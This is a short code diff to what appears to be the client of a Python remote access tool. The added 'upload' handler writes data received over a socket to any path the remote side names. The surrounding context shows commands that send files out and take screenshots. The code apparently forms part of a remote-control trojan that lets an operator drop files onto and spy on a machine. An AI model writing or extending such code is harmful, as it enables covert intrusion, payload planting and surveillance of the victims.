@@ -37,6 +37,22 @@ while True:
 				s.send('complete'.encode())
 			except FileNotFoundError:
 				s.send("[i] File not found".encode())
+		elif data.decode("utf-8") == "upload":
+			path = s.recv(BYTES)
+			print("recieved path as: " + str(path.decode()))
+			#file = s.recv(BYTES)
+			#file = file.decode()
+			f = open(path, "wb")
+			print("Opening file")
+			file = s.recv(BYTES)
+			print("recieving 'file'")
+			while not ('complete' in str(file)):
+				f.write(file)
+				print("writing file")
+				file = s.recv(BYTES)
+				print("recieving file")
+			f.close()
+			print("closing file")
 		elif data.decode("utf-8") == "screenshot":
 			img = cam.grab()
 			name = 'shot' + str(n) + '.png'
